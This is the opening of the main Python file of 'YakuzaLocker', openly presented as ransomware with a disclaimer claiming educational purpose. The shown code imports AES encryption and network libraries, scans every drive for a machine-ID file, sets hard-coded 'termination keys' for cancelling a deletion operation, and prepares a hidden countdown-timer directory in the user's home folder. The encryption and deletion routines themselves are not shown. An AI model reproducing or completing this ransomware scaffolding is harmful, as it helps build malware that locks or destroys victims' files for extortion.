"""Main file of YakuzaLocker
Main file to Combine all Components of YakuzaLocker together
Author: Yakuza-D
Disclaimer: this app written only and only for educational purpose
"""

import os
import sys
import requests
import json
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64
import uuid
from datetime import datetime, timedelta
import time
import ctypes
import logging
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from tkinter import ttk
from PIL import Image, ImageTk


# Defining Function to load the current path of ransom.py and then join it to relative_path
def resource_path(relative_path):
    # Get Directory name of the current python file
    basePath = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

    # join relative_path to directory name of the current python file
    return os.path.join(basePath, relative_path)

# Create Function to Ensure the time Directory Exist
def ensure_time_dir_exist():
    if not os.path.exists(TIME_DIR):
        os.makedirs(TIME_DIR)


# Create Function to Load Machine ID from all drives on the machine
def load_machine_id():
    # Generate a list of all existence drives on the machine
    drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{x}:\\")]

    # Iterate through each drive and check if the Machine_id.txt file exists, then read its contents and return it
    for drive in drives:
        machineIdPath = os.path.join(drive, 'Machine_id.txt')
        if os.path.exists(machineIdPath):
            try:
                with open(machineIdPath, 'r') as file:
                    machineId = file.read().strip()
                    # debug print
                    print(f"[+] Debug: Machine Id loaded successfully from {machineIdPath}: {machineId}")
                    return machineId
            except FileNotFoundError:
                continue
    # debug print
    print(f"[-] Debug: Can't load machine id's, No valid Machine ID found. ")
    return None




# Global constants
TERMINATION_KEY = "bingo"  # Termination keys used to close app and cancel Deleting Operation
# TERMINATION_KEY = "yakuza"
SECONDARY_TERMINATION_KEY = "stop"
# SECONDARY_TERMINATION_KEY = "davood"

# get the current user's home directory
HOME_DIR = os.path.expanduser('~')

# Create Path of Time Directory based on the current user's home directory
TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time') # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')

# Create Path of a timer state file(timer_state.txt) which store in the TIME_DIR
TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')

# Path of application icons and images
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank_you.png")














